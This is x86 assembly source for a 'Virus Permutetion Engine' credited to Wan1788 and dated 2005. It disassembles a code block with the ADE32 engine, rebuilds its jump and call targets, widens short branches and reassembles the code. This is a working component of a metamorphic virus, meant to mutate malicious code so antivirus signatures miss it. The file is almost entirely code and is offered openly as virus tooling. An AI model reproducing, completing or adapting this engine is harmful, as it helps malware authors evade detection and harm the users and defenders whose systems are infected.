; ---------------------------------------------------------------------------
; VPE (Virus Permutetion Engine)   v1.01 (b)   xx june 2005 Wan1788
; ---------------------------------------------------------------------------
include	Ade32bin.inc
;push	size free memory			
;push	size code
;push	address code
;push	free mem
;call	VPE_krn
;add	esp, 4*3
;if (eax == 0) 		--> all ok
;elseif	(eax == 1) 	--> flaw of memory
;				   	
;elseif (eax == -1) --> Unknow Error
;					--> Eror DASM
;					--> Calculate label error
VPE_krn:
		pusha
		mov		edi, [esp+32+4] ; free memory
		mov		esi, [esp+32+4+4] ; address code
		mov		ecx, [esp+32+4+4+4] ; size code
		mov		ebx, [esp+32+4+4+4+4] ; size free memory
		xor		eax, eax
		mov		edx, eax
_MainCycle: 
		mov		4 ptr [edi]._PreStr, eax
		mov		2 ptr [edi], 0404h
		call	DASM
		or		eax, eax
		jz		_ErrorUnknow
		sub		ecx, eax
		jz		_Ok
		js		_Ok
		add		esi, [edi].disasm_len
		add		edx, SizeStruct
		cmp		edx, ebx
		jge		_ErrorMem
		mov		eax, edi
		add		eax, SizeStruct
		mov		4 ptr [edi]._NextrStr, eax
		xchg	eax, edi
		inc		1 ptr [ebp]._CmdNum
		jmp		_MainCycle
_Ok:
		xor		eax, eax              
		mov		4 ptr [ebp].ListEnd, edi
		mov		4 ptr [edi]._NextrStr, eax
		push	4 ptr [esp+32+4]
		call	PreProcc
		pop		ecx   
		inc		eax
		jz		_ErrorUnknow
		xor		eax, eax
Exit:
		mov		[esp].popa_eax, eax
_OkAll:
		popa
		ret
		
_ErrorUnknow:
		dec		eax
		jmp		short Exit	
_ErrorMem:
		xor		eax, eax
		inc		eax
		jmp		short Exit                   	
			
PreProcc:
		pusha
		mov		edi, [esp+32+4]      
		mov		edx, edi 
Main_Loop:
		movzx	eax, 1 ptr [edi]._Flag
		or		eax, eax
		jz		_Skip20
		sub		al, 4
		js		_Skip20
		jz		_Skip20 
		call	_Find
		jc		_@@111
		mov		eax, 4 ptr [edi].disasm_datasize
		sub		al, 4
		jz		__@@4
		mov		al, 1 ptr [edi].disasm_opcode  
		cmp		al, 0EBh
		je		__I1
		cmp		al, 0E8h
		je		__@@4
		mov		4 ptr [edi].disasm_len, 6
		mov		1 ptr [edi].disasm_opcode2, al
		mov		1 ptr [edi].disasm_opcode, 0Fh
		add		1 ptr [edi].disasm_opcode2, 10h
		or		1 ptr [edi].disasm_flag, C_OPCODE2_LG2
		mov		4 ptr [edi].disasm_datasize, 4
		jmp		__@@4
__I1:
		mov		4 ptr [edi].disasm_len, 5
		mov		4 ptr [edi].disasm_datasize, 4
		mov		1 ptr [edi].disasm_opcode, 0E9h
__@@4:
		mov		[edi]._Label, ebx 
		push	1
		pop		4 ptr [ebx]._Label
_Skip20:
		mov		eax, [edi]._NextrStr
		or		eax, eax
		jz		_@@1
		xchg	eax, edi
		jmp		Main_Loop
_Find:
		push	edx
		mov		eax, [edi]._AddrTrans
_@1:
		cmp		eax, [edx]._AddrComand
		jz		_@2
		mov		edx, [edx]._NextrStr
		or		edx, edx
		jz		_@@2
		jmp		_@1
_@@111:
		sbb		eax, eax
		mov		[esp].popa_eax, eax     
_@@1:
		popa
		ret
		
_@2:
		mov		ebx, edx
		pop		edx
		clc
		ret
	
_@@2:
		pop		edx
		stc
		ret   
		
CalcVAddr:
		pusha
		xor		eax, eax    
__@@3:
		mov		[ebx]._NStr, eax
		mov		ebx, [ebx]._NextrStr
		or		ebx, ebx
		jnz		__@@dd  
		mov		[esp].popa_ecx, eax  
		popa
		ret
__@@dd:
		add		eax, 4 ptr [ebx].disasm_len
		jmp		__@@3

DASM:
		pusha
		push	4 ptr [ebp]._TblOpcode
		push	edi
		push	esi
		call	ade32_disasm
		add		esp, 4 * 3
		or		eax, eax
		jz		_ExitDASM
		mov		4 ptr [edi]._AddrComand, esi
		mov 	eax, 4 ptr [esi]
    	cmp     al, 0E8h
    	je      _ProcCall32
        cmp     al, 0E9h
        je      _ProcJmp32
        cmp     al, 0EBh
        je      _ProcJmp8b 
		push   	eax 
        cmp     al, 00Fh
        jne     _skip         
        and     ah, 0F0h
        cmp     ah, 80h
        je      _ProcJmp16h
_skip:                
        pop     eax
        and     al, 0F0h
        cmp     al, 70h
        je      _ProcJmp8b	        	
_ExitDASM:
		mov		eax, [edi].disasm_len
		mov		[esp].popa_eax, eax
		popa
		ret

_ProcJmp8b:			
		mov     1 ptr [edi]._Flag, 03h
        mov     edx, [edi]._AddrComand
        movzx	eax, byte ptr [edx+1]
        cmp		eax, 07Fh
        jg		__91
__92:
        lea     ebx, [edx+2+eax]        					
		jmp		_skip1
__91:
		add		eax, 0FFFFFF00h
		jmp		__92
_ProcJmp32:
		inc		1 ptr [edi]._Flag
		jmp		_ProcAddr32 

_ProcJmp16h:
		inc		1 ptr [edi]._Flag
        mov     edx, [edi]._AddrComand
        mov     eax, [edx+2]
        lea     ebx, [edx+6+eax]
		jmp		_skip@		  
 		
_ProcAddr32:
        mov     edx, [edi]._AddrComand					
		mov		eax, 4 ptr [edx+1]
		lea		ebx, [edx+5+eax]
		jmp		_skip1			          
		
_ProcCall32:
		mov		1 ptr [edi]._Flag, 2
		jmp		_ProcAddr32                     				  
_skip@:
		pop		eax		
_skip1:
		xchg	ebx, [edi]._AddrTrans				
_ret:   jmp		_ExitDASM

VPE_asm:
		pusha
		mov		ebx, [esp+32+4] ; pointer to list structure
		mov		edi, [esp+32+8] ; free memory
		xor		ecx, ecx
_Assemble:
		mov		edx, [ebx]._Label
		or		edx, edx
		jz		__@@6 
		dec		edx
		jz		__@@6
		inc		edx
        mov		eax, [edx]._NStr             
        sub		eax, [ebx]._NStr
        sub		eax, [edx].disasm_len      
        mov		4 ptr [ebx].disasm_data, eax
__@@6:
		push	ebx
		push	edi
		call	ade32_asm
		add		esp, 4 * 2
		mov		eax, 4 ptr [ebx].disasm_len
		add		ecx, eax
		add		edi, eax
		mov		eax, [ebx]._NextrStr
		or		eax, eax
		jz		_EndAssemble
		xchg	eax, ebx
		jmp		_Assemble
_EndAssemble:
		mov		[esp].popa_ecx, ecx
		popa
		ret
